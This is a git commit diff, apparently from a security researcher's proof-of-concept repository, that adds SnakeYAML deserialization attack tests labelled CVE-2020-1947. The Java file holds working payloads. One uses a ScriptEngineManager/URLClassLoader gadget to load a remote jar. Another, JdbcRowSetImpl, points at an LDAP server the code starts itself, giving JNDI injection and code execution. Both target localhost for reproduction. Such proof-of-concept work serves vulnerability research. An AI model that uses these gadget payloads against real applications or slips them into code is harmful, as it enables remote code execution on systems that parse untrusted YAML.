eadf7bbb8d14c91df40fbc1f11d8e5dcb9623e53
“threedr3am” <929811313@qq.com>
2020-03-10 22:03:09 +0800

    feat:CVE-2020-1947

--- spring/spring-boot-actuator-bug/src/main/java/com/threedr3am/bug/spring/actuator/snakeyaml/SnakeYamlTest.java
+++ spring/spring-boot-actuator-bug/src/main/java/com/threedr3am/bug/spring/actuator/snakeyaml/SnakeYamlTest.java
@@ -1,5 +1,8 @@
 package com.threedr3am.bug.spring.actuator.snakeyaml;
 
+import com.threedr3am.bug.common.server.LdapServer;
+import java.util.HashMap;
+import java.util.Map;
 import org.yaml.snakeyaml.Yaml;
 
 /**
@@ -10,16 +13,26 @@ public class SnakeYamlTest {
   public static void main(String[] args) {
     testNewInstance();
     testAttack();
+    testAttack2();
   }
 
   public static void testNewInstance() {
     Yaml yaml = new Yaml();
+    Map<Object, Object> map = new HashMap<>();
+    map.put("111", new A("xxx"));
+    System.out.println(yaml.dump(map));;
     yaml.load("!!com.threedr3am.bug.spring.actuator.snakeyaml.A [\"threedr3am\"]");
   }
 
   public static void testAttack() {
     Yaml yaml = new Yaml();
-    yaml.load("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:80/common-1.0-SNAPSHOT.jar\"]]]]");
+    yaml.load("'111': !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:80/common-1.0-SNAPSHOT.jar']]]]");
+  }
+
+  public static void testAttack2() {
+    new Thread(() -> LdapServer.run()).start();
+    Yaml yaml = new Yaml();
+    yaml.load("!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap://127.0.0.1:43658/Calc\n  autoCommit: true");
   }
 
 }
